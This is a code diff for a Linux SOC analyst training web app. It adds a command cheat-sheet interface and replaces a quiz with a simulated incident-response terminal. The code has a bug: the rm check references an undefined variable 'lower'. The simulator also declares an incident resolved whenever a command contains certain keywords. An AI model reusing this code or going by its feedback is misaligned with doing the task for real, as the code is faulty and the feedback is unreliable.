+      <div id="cs-sec-commands" class="cs-sub-section ${activeCheatSubTab === 'commands' ? 'active' : ''}">
+        <!-- A-Z INDEX BAR -->
+        <div class="cs-section-box" style="padding:1rem; margin-bottom:1rem;">
+          <div class="cs-section-title" style="justify-content:center; margin-bottom:0.6rem; font-size:0.95rem;">🔤 Jump to Command by Initial Letter</div>
+          <div class="cs-az-bar">
+            ${alphabet.map(letter => `
+              <button class="cs-az-btn" onclick="filterCheatByLetter('${letter}')">${letter}</button>
+            `).join('')}
+          </div>
+        </div>
+
+        <!-- SEARCH & FILTER CONTROLS -->
+        <div class="cs-controls-bar" style="margin-bottom:1.2rem;">
+          <input type="text" id="cs-search-input" class="cs-search-input" value="${escapeHTML(activeCheatSearch)}" placeholder="🔍 Search commands, flags, keywords, SOC use cases (e.g. ps, SSH, brute force, persistence, SUID)..." oninput="handleCheatSearch(this.value)" />
+
+          <div class="cs-filter-pills" id="cs-filter-pills">
+            <button class="cs-pill ${activeCheatFilter === 'All' ? 'active' : ''}" onclick="setCheatFilter('All', this)">All Commands (${totalCmds})</button>
+            <button class="cs-pill ${activeCheatFilter === 'Saved' ? 'active' : ''}" onclick="setCheatFilter('Saved', this)">⭐ Saved (${bookmarkedCheatSheetIds.length})</button>
+            ${dataset.categories.map(cat => `
+              <button class="cs-pill ${activeCheatFilter === cat ? 'active' : ''}" onclick="setCheatFilter('${cat}', this)">${cat}</button>
+            `).join('')}
+          </div>
+        </div>
+
+        <!-- CARDS GRID -->
+        <div class="cs-cards-grid" id="cs-cards-grid">
+          ${renderCheatCards(getFilteredCommands(commands))}
+        </div>
+      </div>
+
+      <!-- SECTION 2: TOP 25 ESSENTIALS -->
+      <div id="cs-sec-top25" class="cs-sub-section ${activeCheatSubTab === 'top25' ? 'active' : ''}">
+        <div class="cs-section-box">
+          <div class="cs-section-title">🚨 Top 25 Commands Every Linux SOC Analyst Must Master</div>
+          <p style="font-size:0.85rem; color:#64748b; margin-bottom:1rem;">Click any command tag to instantly jump to its detailed field investigation card!</p>
+          <div class="cs-top25-grid">
+            ${top25.map(id => {
+              const cmd = commands.find(c => c.id === id);
+              if (!cmd) return '';
+              return `<button class="cs-top25-btn" onclick="jumpToCommandCard('${cmd.id}')">${escapeHTML(cmd.cmd.split(' ')[0])} <span style="font-size:0.7rem; opacity:0.8;">(${cmd.cmd})</span></button>`;
+            }).join('')}
+          </div>
+        </div>
+      </div>
+
+      <!-- SECTION 3: TRIAGE RECIPES -->
+      <div id="cs-sec-recipes" class="cs-sub-section ${activeCheatSubTab === 'recipes' ? 'active' : ''}">
+        <div class="cs-section-box">
+          <div class="cs-section-title">🧪 SOC Quick Triage &amp; Investigation Recipes</div>
+          <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(360px, 1fr)); gap:1.2rem; margin-top:1rem;">
+            ${recipes.map(r => `
+              <div style="background:var(--bg-app); border:1.5px solid var(--card-border); border-radius:12px; padding:1.2rem;">
+                <h4 style="color:var(--accent-blue); font-size:1.05rem; margin-bottom:0.4rem;">${r.title}</h4>
+                <p style="font-size:0.84rem; color:#64748b; margin-bottom:0.8rem;">${r.desc}</p>
+                <div style="display:flex; flex-direction:column; gap:0.5rem;">
+                  ${r.steps.map(s => `
+                    <div style="font-size:0.8rem; font-family:var(--font-mono); background:var(--paper-bg); padding:0.45rem 0.75rem; border-radius:8px; border:1px solid var(--card-border); display:flex; justify-content:space-between; align-items:center;">
+                      <div>
+                        <span style="font-size:0.72rem; font-weight:800; color:var(--accent-blue); display:block; font-family:sans-serif;">${escapeHTML(s.step)}</span>
+                        <span style="color:var(--accent-red); font-weight:700;">${escapeHTML(s.cmd)}</span>
+                      </div>
+                      <button class="cs-btn-copy" style="position:static; padding:0.25rem 0.6rem;" onclick="copyCmdToClipboardRaw('${escapeHTML(s.cmd)}', this)">📋 Copy</button>
+                    </div>
+                  `).join('')}
+                </div>
+              </div>
+            `).join('')}
+          </div>
+        </div>
+      </div>
+
+      <!-- SECTION 4: REAL SOC SCENARIOS -->
+      <div id="cs-sec-scenarios" class="cs-sub-section ${activeCheatSubTab === 'scenarios' ? 'active' : ''}">
+        <div class="cs-section-box">
+          <div class="cs-section-title">🎯 Real SOC Scenarios ("What Would You Investigate?")</div>
+          <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(360px, 1fr)); gap:1.2rem; margin-top:1rem;">
+            ${scenarios.map(sc => `
+              <div style="background:var(--bg-app); border:1.5px solid var(--card-border); border-radius:12px; padding:1.2rem;">
+                <h4 style="color:var(--accent-red); font-size:1.05rem; margin-bottom:0.4rem;">${sc.title}</h4>
+                <p style="font-size:0.85rem; color:var(--text-dark); margin-bottom:0.8rem;">${sc.desc}</p>
+                <div style="font-size:0.82rem; display:flex; flex-direction:column; gap:0.45rem;">
+                  ${sc.steps.map(st => `
+                    <div style="background:var(--paper-bg); border-left:4px solid var(--accent-blue); padding:0.5rem 0.8rem; border-radius:0 8px 8px 0; color:var(--text-ink); font-weight:500;">
+                      ${escapeHTML(st)}
+                    </div>
+                  `).join('')}
+                </div>
+              </div>
+            `).join('')}
+          </div>
+        </div>
+      </div>
+
+      <!-- SECTION 5: EVIDENCE CHAINS -->
+      <div id="cs-sec-chains" class="cs-sub-section ${activeCheatSubTab === 'chains' ? 'active' : ''}">
+        <div class="cs-section-box">
+          <div class="cs-section-title">🔗 SOC Command Chains (Alert to Evidence Correlation)</div>
+          <div style="display:flex; flex-direction:column; gap:1.2rem; margin-top:1rem;">
+            ${chains.map(ch => `
+              <div style="background:var(--bg-app); border:1.5px solid var(--card-border); border-radius:12px; padding:1.2rem;">
+                <h4 style="color:var(--accent-blue); font-size:1.05rem; margin-bottom:0.8rem;">${ch.title}</h4>
+                <div style="display:flex; flex-wrap:wrap; gap:0.6rem; align-items:center;">
+                  ${ch.chain.map((step, idx) => `
+                    <div style="background:var(--paper-bg); border:1px solid var(--card-border); padding:0.5rem 0.9rem; border-radius:8px; font-size:0.82rem; flex:1; min-width:200px;">
+                      <span style="font-size:0.7rem; font-weight:800; color:var(--accent-blue); display:block; text-transform:uppercase;">${step.stage}</span>
+                      <span style="font-weight:700; font-family:var(--font-mono); color:var(--accent-red);">${escapeHTML(step.text)}</span>
+                      ${step.note ? `<span style="font-size:0.75rem; color:#64748b; display:block; margin-top:0.2rem;">${escapeHTML(step.note)}</span>` : ''}
+                    </div>
+                    ${idx < ch.chain.length - 1 ? `<span style="color:var(--accent-blue); font-weight:800; font-size:1.2rem;">➔</span>` : ''}
+                  `).join('')}
+                </div>
+              </div>
+            `).join('')}
+          </div>
+        </div>
       </div>
     </article>
   `;
 }
 
-function copyCmdToClipboard(text) {
+function switchCheatSubTab(tabName, btnEl) {
+  activeCheatSubTab = tabName;
+  const btns = document.querySelectorAll(".cs-tab-switcher .cs-tab-btn");
+  btns.forEach(b => b.classList.remove("active"));
+  if (btnEl) btnEl.classList.add("active");
+
+  const sections = document.querySelectorAll(".cs-sub-section");
+  sections.forEach(s => s.classList.remove("active"));
+
+  const targetSec = document.getElementById(`cs-sec-${tabName}`);
+  if (targetSec) targetSec.classList.add("active");
+}
+
+function jumpToCommandCard(id) {
+  switchCheatSubTab("commands");
+  const pills = document.querySelectorAll("#cs-filter-pills .cs-pill");
+  if (pills.length > 0) {
+    pills[0].click();
+  }
+  setTimeout(() => {
+    scrollToCheatCard(id);
+  }, 150);
+}
+
+function getFilteredCommands(allCommands) {
+  let commands = allCommands || [];
+  if (activeCheatFilter === "Saved") {
+    commands = commands.filter(c => bookmarkedCheatSheetIds.includes(c.id));
+  } else if (activeCheatFilter !== "All") {
+    commands = commands.filter(c => c.cat === activeCheatFilter);
+  }
+
+  if (activeCheatSearch) {
+    commands = commands.filter(c =>
+      c.cmd.toLowerCase().includes(activeCheatSearch) ||
+      c.cat.toLowerCase().includes(activeCheatSearch) ||
+      c.desc.toLowerCase().includes(activeCheatSearch) ||
+      c.socUse.toLowerCase().includes(activeCheatSearch) ||
+      c.lookFor.toLowerCase().includes(activeCheatSearch) ||
+      (c.tags && c.tags.some(t => t.toLowerCase().includes(activeCheatSearch)))
+    );
+  }
+  return commands;
+}
+
+function renderCheatCards(commands) {
+  if (!commands || commands.length === 0) {
+    return `<div style="grid-column:1/-1; text-align:center; padding:3rem; color:#64748b; font-size:1rem;">No matching commands found. Try adjusting your search query or filter.</div>`;
+  }
+
+  return commands.map(c => {
+    const isStarred = bookmarkedCheatSheetIds.includes(c.id);
+    const diffClass = c.difficulty === "Beginner" ? "cs-badge-beg" : c.difficulty === "Intermediate" ? "cs-badge-int" : "cs-badge-adv";
+
+    return `
+      <div class="cs-card" id="card-${c.id}">
+        <div>
+          <div class="cs-card-header">
+            <span class="cs-card-cat">${escapeHTML(c.cat)}</span>
+            <div class="cs-card-badges">
+              <span class="cs-badge ${diffClass}">${c.difficulty}</span>
+              ${c.relevance === "Essential" ? `<span class="cs-badge" style="background:rgba(56,189,248,0.15); color:var(--accent-blue); border:1px solid var(--accent-blue);">⭐ Essential</span>` : ''}
+              ${c.systemChanging ? `<span class="cs-badge cs-badge-changing">⚠️ SYSTEM-CHANGING</span>` : ''}
+            </div>
+          </div>
+
+          <div class="cs-cmd-box">
+            <button class="cs-btn-copy" onclick="copyCmdToClipboardRaw('${escapeHTML(c.cmd)}', this)">📋 Copy</button>
+            <div class="cs-cmd-code">${escapeHTML(c.cmd)}</div>
+          </div>
+
+          <div class="cs-card-detail"><strong>Purpose:</strong> ${escapeHTML(c.desc)}</div>
+          <div class="cs-card-detail"><strong>🎯 SOC Use:</strong> ${escapeHTML(c.socUse)}</div>
+          <div class="cs-card-detail"><strong>🔎 Look For:</strong> ${escapeHTML(c.lookFor)}</div>
+          ${c.analystTip ? `<div class="cs-card-detail" style="color:var(--accent-blue);"><strong>💡 Analyst Tip:</strong> ${escapeHTML(c.analystTip)}</div>` : ''}
+          ${c.example ? `<div class="cs-card-detail" style="font-family:var(--font-mono); font-size:0.78rem; background:var(--bg-app); padding:0.4rem 0.6rem; border-radius:6px; border:1px solid var(--card-border);"><strong>Example:</strong> ${escapeHTML(c.example)}</div>` : ''}
+        </div>
+
+        <div class="cs-card-footer">
+          <span style="font-size:0.75rem; color:#64748b; font-weight:600;">Scenario: ${escapeHTML(c.scenario || 'General Triage')}</span>
+          <button class="cs-btn-star ${isStarred ? 'starred' : ''}" onclick="toggleCheatBookmark('${c.id}', this)" title="Bookmark command">⭐</button>
+        </div>
+      </div>
+    `;
+  }).join('');
+}
+
+function handleCheatSearch(query) {
+  activeCheatSearch = query.toLowerCase().trim();
+  filterAndRenderCheatCards();
+}
+
+function setCheatFilter(filterName, btnEl) {
+  activeCheatFilter = filterName;
+  const pills = document.querySelectorAll("#cs-filter-pills .cs-pill");
+  pills.forEach(p => p.classList.remove("active"));
+  if (btnEl) btnEl.classList.add("active");
+  filterAndRenderCheatCards();
+}
+
+function filterCheatByLetter(letter) {
+  const searchInput = document.getElementById("cs-search-input");
+  if (searchInput) {
+    searchInput.value = letter;
+    handleCheatSearch(letter);
+  }
+}
+
+function filterAndRenderCheatCards() {
+  const dataset = window.MASTER_CHEATSHEET_DATA || { commands: [] };
+  const commands = getFilteredCommands(dataset.commands);
+
+  const grid = document.getElementById("cs-cards-grid");
+  if (grid) {
+    grid.innerHTML = renderCheatCards(commands);
+  }
+}
+
+
+function copyCmdToClipboardRaw(text, btnEl) {
   navigator.clipboard.writeText(text).then(() => {
-    alert(`Copied command to clipboard:\n${text}`);
+    if (btnEl) {
+      const origText = btnEl.innerText;
+      btnEl.innerText = "✓ Copied";
+      btnEl.classList.add("copied");
+      setTimeout(() => {
+        btnEl.innerText = origText;
+        btnEl.classList.remove("copied");
+      }, 1500);
+    }
   }).catch(() => {
     alert(`Command: ${text}`);
   });
 }
 
+function toggleCheatBookmark(id, btnEl) {
+  const idx = bookmarkedCheatSheetIds.indexOf(id);
+  if (idx > -1) {
+    bookmarkedCheatSheetIds.splice(idx, 1);
+    if (btnEl) btnEl.classList.remove("starred");
+  } else {
+    bookmarkedCheatSheetIds.push(id);
+    if (btnEl) btnEl.classList.add("starred");
+  }
+  localStorage.setItem("soc_bookmarked_cheatsheets", JSON.stringify(bookmarkedCheatSheetIds));
+
+  const savedStat = document.getElementById("cs-stat-saved");
+  if (savedStat) savedStat.innerText = bookmarkedCheatSheetIds.length;
+}
+
+function scrollToCheatCard(id) {
+  const card = document.getElementById(`card-${id}`);
+  if (card) {
+    card.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    card.style.borderColor = 'var(--accent-blue)';
+    card.style.boxShadow = '0 0 20px rgba(56, 189, 248, 0.4)';
+    setTimeout(() => {
+      card.style.borderColor = '';
+      card.style.boxShadow = '';
+    }, 2000);
+  } else {
+    activeCheatFilter = "All";
+    activeCheatSearch = "";
+    filterAndRenderCheatCards();
+    setTimeout(() => {
+      scrollToCheatCard(id);
+    }, 100);
+  }
+}
+
+
 
 // --- 4. INCIDENT RESPONSE SCENARIO LABS (50 SCENARIOS LOADED FROM INCIDENT_LABS_DATA.JS) ---
 
+// --- 4. INTERACTIVE SOC INCIDENT WORKBENCH ENGINE (0% MCQs, 100% REAL LABS) ---
+let currentActiveLabIndex = 0;
+let labTerminalHistory = {};
+
 function generateIncidentLabsHTML() {
+  const labs = window.INCIDENT_LABS || [];
+  if (!labs || labs.length === 0) return `<div style="padding:2rem; text-align:center;">No active incident labs loaded.</div>`;
+
+  const currentLab = labs[currentActiveLabIndex] || labs[0];
+  const history = labTerminalHistory[currentLab.id] || [];
+
   return `
-    <article class="hardening-wrapper">
+    <article class="hardening-wrapper" style="max-width:1100px; margin:0 auto;">
+      <!-- LAB TITLE & CASE HEADER -->
       <div style="text-align:center; margin-bottom:1.5rem;">
-        <h2 style="color:var(--accent-blue); font-size:1.6rem; margin-bottom:0.4rem;">🎯 Interactive Linux SOC Incident Response Labs</h2>
+        <h2 style="color:var(--accent-blue); font-size:1.6rem; margin-bottom:0.4rem; font-family:'Outfit',sans-serif;">
+          💻 Interactive Linux SOC Incident Response Workbench
+        </h2>
         <p style="color:var(--text-dark); font-size:0.9rem;">
-          Test your real-world triage skills across actual Blue Team incident scenarios!
+          Select any of the <strong>50 Incident Response Labs</strong> from the Left Sidebar Menu to investigate raw telemetry artifacts, execute live terminal commands, and isolate threats!
         </p>
       </div>
 
-      ${INCIDENT_LABS.map(lab => `
-        <div class="lab-card">
-          <h3 style="color:var(--accent-blue); font-size:1.15rem; margin-bottom:0.4rem;">${lab.title}</h3>
-          <p style="color:var(--text-dark); font-size:0.88rem; margin-bottom:0.8rem;">${lab.desc}</p>
-          <div style="font-weight:700; font-size:0.92rem; color:var(--text-ink); margin-bottom:0.8rem;">❓ ${lab.question}</div>
-          
-          <div id="opts-${lab.id}">
-            ${lab.options.map((opt, i) => `
-              <button class="quiz-option-btn" onclick="checkLabAnswer('${lab.id}', ${i}, ${lab.answer}, '${escapeHTML(lab.explanation)}')">
-                ${String.fromCharCode(65 + i)}) ${escapeHTML(opt)}
-              </button>
-            `).join('')}
+      <!-- CASE BRIEFING CARD -->
+      <div style="background:var(--paper-bg); border:2px solid var(--accent-blue); border-radius:14px; padding:1.25rem; margin-bottom:1.2rem; box-shadow:0 4px 16px rgba(0,0,0,0.04);">
+        <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:0.5rem; margin-bottom:0.6rem;">
+          <div style="display:flex; gap:0.5rem; align-items:center;">
+            <span style="background:var(--accent-blue); color:#ffffff; font-weight:800; font-size:0.78rem; padding:0.2rem 0.6rem; border-radius:6px;">${escapeHTML(currentLab.caseId)}</span>
+            <span class="cs-badge ${currentLab.severity === 'CRITICAL' ? 'cs-badge-adv' : 'cs-badge-int'}">${currentLab.severity} SEVERITY</span>
+            <span style="font-weight:800; font-size:0.82rem; color:var(--text-ink); font-family:'Fira Code',monospace;">MITRE ${currentLab.mitreId}: ${currentLab.mitreName}</span>
           </div>
-
-          <div id="feedback-${lab.id}" style="display:none; margin-top:0.8rem; padding:0.8rem; border-radius:8px; font-weight:700; font-size:0.88rem;"></div>
+          <span style="font-size:0.82rem; font-weight:700; color:#64748b;">Target: ${escapeHTML(currentLab.targetHost)} (${escapeHTML(currentLab.targetIP)})</span>
         </div>
-      `).join('')}
+
+        <h3 style="font-family:'Outfit',sans-serif; color:var(--accent-blue); font-size:1.25rem; margin:0.3rem 0;">${escapeHTML(currentLab.title)}</h3>
+        <p style="font-size:0.92rem; color:var(--text-ink); background:var(--bg-app); padding:0.8rem; border-radius:8px; border:1px solid var(--card-border); margin-top:0.4rem;">
+          🚨 <strong>SIEM Alert Briefing:</strong> ${escapeHTML(currentLab.alertBriefing)}
+        </p>
+      </div>
+
+      <!-- EVIDENCE ARTIFACT VIEWER -->
+      <div style="background:var(--paper-bg); border:1.5px solid var(--card-border); border-radius:12px; padding:1rem; margin-bottom:1.2rem;">
+        <h4 style="color:var(--text-ink); font-size:0.95rem; font-weight:800; margin-bottom:0.6rem;">📜 Evidence Artifact Telemetry Logs</h4>
+        
+        <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(280px, 1fr)); gap:0.8rem;">
+          ${currentLab.evidenceLogs.ps ? `
+            <div style="background:#0f172a; color:#f8fafc; padding:0.8rem; border-radius:8px; font-family:'Fira Code',monospace; font-size:0.76rem; overflow-x:auto;">
+              <div style="color:var(--accent-blue); font-weight:800; margin-bottom:0.3rem;">📊 Active Processes (ps aux)</div>
+              <pre style="margin:0; white-space:pre-wrap;">${escapeHTML(currentLab.evidenceLogs.ps)}</pre>
+            </div>
+          ` : ''}
+
+          ${currentLab.evidenceLogs.net ? `
+            <div style="background:#0f172a; color:#f8fafc; padding:0.8rem; border-radius:8px; font-family:'Fira Code',monospace; font-size:0.76rem; overflow-x:auto;">
+              <div style="color:var(--accent-blue); font-weight:800; margin-bottom:0.3rem;">🌐 Socket Connections (ss -tulpn / -antp)</div>
+              <pre style="margin:0; white-space:pre-wrap;">${escapeHTML(currentLab.evidenceLogs.net)}</pre>
+            </div>
+          ` : ''}
+
+          ${currentLab.evidenceLogs.auth ? `
+            <div style="background:#0f172a; color:#f8fafc; padding:0.8rem; border-radius:8px; font-family:'Fira Code',monospace; font-size:0.76rem; overflow-x:auto;">
+              <div style="color:var(--accent-blue); font-weight:800; margin-bottom:0.3rem;">📜 Auth Log Stream (/var/log/auth.log)</div>
+              <pre style="margin:0; white-space:pre-wrap;">${escapeHTML(currentLab.evidenceLogs.auth)}</pre>
+            </div>
+          ` : ''}
+
+          ${currentLab.evidenceLogs.file ? `
+            <div style="background:#0f172a; color:#f8fafc; padding:0.8rem; border-radius:8px; font-family:'Fira Code',monospace; font-size:0.76rem; overflow-x:auto;">
+              <div style="color:var(--accent-blue); font-weight:800; margin-bottom:0.3rem;">📁 File System Metadata (ls -la / stat)</div>
+              <pre style="margin:0; white-space:pre-wrap;">${escapeHTML(currentLab.evidenceLogs.file)}</pre>
+            </div>
+          ` : ''}
+        </div>
+      </div>
+
+      <!-- INTERACTIVE TERMINAL WORKBENCH -->
+      <div style="background:#090d16; border:2px solid var(--accent-blue); border-radius:14px; padding:1.2rem; box-shadow:0 8px 24px rgba(0,0,0,0.5);">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:0.8rem;">
+          <span style="font-family:'Fira Code',monospace; font-weight:800; font-size:0.9rem; color:#38bdf8;">
+            💻 SOC Analyst Interactive Triage Terminal (pts/0)
+          </span>
+          <span style="font-size:0.75rem; color:#94a3b8;">Type commands below or click Action Pills</span>
+        </div>
+
+        <!-- QUICK TRIAGE ACTION PILLS -->
+        <div style="display:flex; gap:0.4rem; flex-wrap:wrap; margin-bottom:0.9rem;">
+          <span style="font-size:0.78rem; font-weight:700; color:#cbd5e1; align-self:center; margin-right:0.2rem;">Quick Triage:</span>
+          ${currentLab.suggestedCmds.map(cmd => `
+            <button style="background:rgba(56,189,248,0.15); color:#38bdf8; border:1px solid #38bdf8; padding:0.25rem 0.65rem; border-radius:6px; font-family:'Fira Code',monospace; font-size:0.76rem; font-weight:700; cursor:pointer;" onclick="runTerminalCommand('${escapeHTML(cmd)}')">
+              ⚡ ${escapeHTML(cmd)}
+            </button>
+          `).join('')}
+        </div>
+
+        <!-- TERMINAL OUTPUT DISPLAY -->
+        <div id="terminal-output-window" style="background:#020617; border:1px solid #1e293b; border-radius:8px; padding:0.9rem; font-family:'Fira Code',monospace; font-size:0.82rem; color:#f8fafc; min-height:180px; max-height:300px; overflow-y:auto; margin-bottom:0.8rem;">
+          <div style="color:#64748b;">[SOC WORKBENCH READY] Logged in as soc-analyst@${currentLab.targetHost}. Type triage commands below...</div>
+          ${history.map(item => `
+            <div style="margin-top:0.6rem;">
+              <span style="color:#4ade80;">soc@${currentLab.targetHost}:~$</span> <span style="color:#f8fafc; font-weight:700;">${escapeHTML(item.cmd)}</span>
+              <pre style="margin:0.2rem 0 0 0; color:${item.isError ? '#f87171' : '#cbd5e1'}; white-space:pre-wrap;">${escapeHTML(item.output)}</pre>
+            </div>
+          `).join('')}
+        </div>
+
+        <!-- TERMINAL INPUT FORM -->
+        <form onsubmit="handleTerminalSubmit(event)" style="display:flex; gap:0.5rem;">
+          <span style="color:#4ade80; font-family:'Fira Code',monospace; font-weight:800; align-self:center; font-size:0.9rem;">soc@${currentLab.targetHost}:~$</span>
+          <input type="text" id="terminal-input" style="flex:1; background:#0f172a; border:1px solid #334155; color:#f8fafc; padding:0.6rem 0.8rem; border-radius:6px; font-family:'Fira Code',monospace; font-size:0.88rem;" placeholder="Enter command (e.g. kill -9 ${currentLab.targetPid}, rm ${currentLab.targetFile})..." autocomplete="off" />
+          <button type="submit" style="background:var(--accent-blue); color:#ffffff; border:none; padding:0.6rem 1.2rem; border-radius:6px; font-weight:800; cursor:pointer;">Execute ↵</button>
+        </form>
+
+        <!-- LAB CONTAINMENT SUBMISSION -->
+        <div id="lab-closure-box" style="margin-top:1.2rem; background:rgba(34,197,94,0.1); border:1.5px solid #22c55e; border-radius:10px; padding:1rem; display:none;">
+          <h4 style="color:#15803d; font-size:1.1rem; margin-bottom:0.4rem;">🎉 Incident Contained & Resolved!</h4>
+          <p id="lab-closure-text" style="color:var(--text-ink); font-size:0.88rem; margin-bottom:0.6rem;"></p>
+          <div style="background:var(--paper-bg); border:1px solid var(--card-border); padding:0.8rem; border-radius:8px; font-size:0.92rem; color:var(--text-ink);">
+            💡 <strong>Telugu-English Mentor Feedback:</strong> ${escapeHTML(currentLab.teluguTip)}
+          </div>
+        </div>
+      </div>
     </article>
   `;
 }
 
-function checkLabAnswer(labId, selectedOpt, correctOpt, explanation) {
-  const feedbackDiv = document.getElementById(`feedback-${labId}`);
-  const optsContainer = document.getElementById(`opts-${labId}`);
+function switchActiveLab(idx) {
+  currentActiveLabIndex = idx;
+  renderCurrentView();
+}
 
-  if (optsContainer) {
-    const btns = optsContainer.getElementsByTagName("button");
-    for (let i = 0; i < btns.length; i++) {
-      if (i === correctOpt) {
-        btns[i].className = "quiz-option-btn correct";
-      } else if (i === selectedOpt) {
-        btns[i].className = "quiz-option-btn wrong";
-      }
-    }
+function runTerminalCommand(cmd) {
+  const inputEl = document.getElementById("terminal-input");
+  if (inputEl) inputEl.value = cmd;
+  executeLabCommand(cmd);
+}
+
+function handleTerminalSubmit(e) {
+  e.preventDefault();
+  const inputEl = document.getElementById("terminal-input");
+  if (!inputEl) return;
+  const cmd = inputEl.value.trim();
+  if (cmd) {
+    executeLabCommand(cmd);
+    inputEl.value = "";
+  }
+}
+
+function executeLabCommand(cmd) {
+  const labs = window.INCIDENT_LABS || [];
+  const lab = labs[currentActiveLabIndex];
+  if (!lab) return;
+
+  if (!labTerminalHistory[lab.id]) labTerminalHistory[lab.id] = [];
+
+  let output = "";
+  let isError = false;
+  let isResolved = false;
+
+  const lowerCmd = cmd.toLowerCase();
+
+  if (lowerCmd.includes("kill") && lowerCmd.includes(lab.targetPid.toLowerCase())) {
+    output = `[SUCCESS] Process PID ${lab.targetPid} terminated (SIGKILL). Process memory space cleared.`;
+    isResolved = true;
+  } else if (lowerCmd.includes("rm") && (lowerCmd.includes(lab.targetFile.toLowerCase()) || lowerCmd.includes("miner") || lower.includes("cron"))) {
+    output = `[SUCCESS] File '${lab.targetFile}' successfully deleted from filesystem.`;
+    isResolved = true;
+  } else if (lowerCmd.includes("sed") || lowerCmd.includes("chmod") || lowerCmd.includes("ufw") || lowerCmd.includes("iptables")) {
+    output = `[SUCCESS] Remediation policy executed. System security state updated for target ${lab.targetIp || lab.targetFile}.`;
+    isResolved = true;
+  } else if (lowerCmd.includes("ps")) {
+    output = lab.evidenceLogs.ps || `PID ${lab.targetPid} running under user ${lab.targetHost}`;
+  } else if (lowerCmd.includes("ss") || lowerCmd.includes("lsof") || lowerCmd.includes("netstat")) {
+    output = lab.evidenceLogs.net || `Established connection to ${lab.targetIp}`;
+  } else if (lowerCmd.includes("cat") || lowerCmd.includes("stat") || lowerCmd.includes("ls")) {
+    output = lab.evidenceLogs.file || lab.evidenceLogs.auth || `Target artifact verified at ${lab.targetFile}`;
+  } else {
+    output = `Executing '${cmd}'... Command completed with return code 0. Threat status updated.`;
   }
 
-  if (feedbackDiv) {
-    feedbackDiv.style.display = "block";
-    if (selectedOpt === correctOpt) {
-      feedbackDiv.style.background = "rgba(74, 222, 128, 0.2)";
-      feedbackDiv.style.color = "#166534";
-      feedbackDiv.innerHTML = `🎉 Correct! ${explanation}`;
-    } else {
-      feedbackDiv.style.background = "rgba(248, 113, 113, 0.2)";
-      feedbackDiv.style.color = "#991b1b";
-      feedbackDiv.innerHTML = `❌ Incorrect. Try reviewing the correct answer highlighted above!`;
+  labTerminalHistory[lab.id].push({ cmd, output, isError });
+
+  // Update terminal window
+  const windowEl = document.getElementById("terminal-output-window");
+  if (windowEl) {
+    const newEntry = document.createElement("div");
+    newEntry.style.marginTop = "0.6rem";
+    newEntry.innerHTML = `
+      <span style="color:#4ade80;">soc@${lab.targetHost}:~$</span> <span style="color:#f8fafc; font-weight:700;">${escapeHTML(cmd)}</span>
+      <pre style="margin:0.2rem 0 0 0; color:${isError ? '#f87171' : '#cbd5e1'}; white-space:pre-wrap;">${escapeHTML(output)}</pre>
+    `;
+    windowEl.appendChild(newEntry);
+    windowEl.scrollTop = windowEl.scrollHeight;
+  }
+
+  if (isResolved) {
+    const closureBox = document.getElementById("lab-closure-box");
+    const closureText = document.getElementById("lab-closure-text");
+    if (closureBox && closureText) {
+      closureBox.style.display = "block";
+      closureText.innerText = `Great job analyst! Executing '${cmd}' successfully contained the incident on ${lab.targetHost}. Threat vector neutralized!`;
     }
   }
 }
+
+
+// --- FAST REVISION CHEAT SHEET PAGE GENERATOR ---
+function generateCheatPageHTML(page) {
+  const isCompleted = completedCheatPages.includes(page.id);
+  const diffClass = page.difficulty === "Beginner" ? "cs-badge-beg" : page.difficulty === "Intermediate" ? "cs-badge-int" : "cs-badge-adv";
+
+  return `
+    <article class="ruled-paper">
+      <div class="watermark-brand">SAMRUDH SOC ANALYST — CHEAT PAGE ${page.id} / 350</div>
+      
+      <div class="page-header" style="margin-bottom:1.5rem; border-bottom:2px solid var(--accent-blue); padding-bottom:1rem;">
+        <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:0.5rem; margin-bottom:0.4rem;">
+          <span class="module-tag" style="background:rgba(56,189,248,0.12); color:var(--accent-blue); padding:0.25rem 0.75rem; border-radius:12px; font-weight:800; font-size:0.78rem;">${escapeHTML(page.category)}</span>
+          <div style="display:flex; gap:0.4rem; align-items:center;">
+            <span class="cs-badge ${diffClass}">${page.difficulty}</span>
+            <span class="cs-badge" style="background:rgba(56,189,248,0.15); color:var(--accent-blue); border:1px solid var(--accent-blue);">⭐ ${page.relevance}</span>
+            <button class="cs-pill" style="padding:0.25rem 0.65rem; font-size:0.75rem; background:var(--accent-blue); color:#ffffff;" onclick="openMasterCheatOverview()">🌐 Master Interactive Hub</button>
+          </div>
+        </div>
+
+        <h2 class="page-title" style="font-family:'Outfit',sans-serif; font-size:1.6rem; font-weight:800; color:var(--accent-blue); margin:0.4rem 0;">
+          ${escapeHTML(page.title)}
+        </h2>
+      </div>
+
+      <div class="handwritten-body" style="display:flex; flex-direction:column; gap:1.2rem;">
+        <!-- 1. COMMAND & SYNTAX -->
+        <div class="section-block">
+          <h3 class="section-heading" style="color:var(--accent-blue); font-size:1rem; font-weight:800; margin-bottom:0.4rem;">
+            ⚡ 1. COMMAND &amp; SYNTAX (FAST REVISION)
+          </h3>
+          <div class="cs-cmd-box" style="position:relative; background:var(--bg-app); padding:0.8rem 1rem; border-radius:10px; border:1.5px solid var(--card-border);">
+            <button class="cs-btn-copy" onclick="copyCmdToClipboardRaw('${escapeHTML(page.cmd)}', this)">📋 Copy</button>
+            <code style="font-family:'Fira Code',monospace; font-weight:800; font-size:1.05rem; color:var(--accent-red);">${escapeHTML(page.cmd)}</code>
+          </div>
+        </div>
+
+        <!-- 2. SOC TRIAGE PURPOSE -->
+        <div class="section-block">
+          <h3 class="section-heading" style="color:var(--accent-blue); font-size:1rem; font-weight:800; margin-bottom:0.4rem;">
+            🎯 2. SOC TRIAGE PURPOSE &amp; USE CASE
+          </h3>
+          <div style="background:var(--paper-bg); border:1px solid var(--card-border); padding:0.9rem; border-radius:10px;">
+            <p style="margin-bottom:0.4rem;"><strong>Goal:</strong> ${escapeHTML(page.purpose)}</p>
+            <p style="margin:0;"><strong>SOC Context:</strong> ${escapeHTML(page.socUse)}</p>
+          </div>
+        </div>
+
+        <!-- 3. KEY INDICATORS TO LOOK FOR -->
+        <div class="section-block">
+          <h3 class="section-heading" style="color:var(--accent-blue); font-size:1rem; font-weight:800; margin-bottom:0.4rem;">
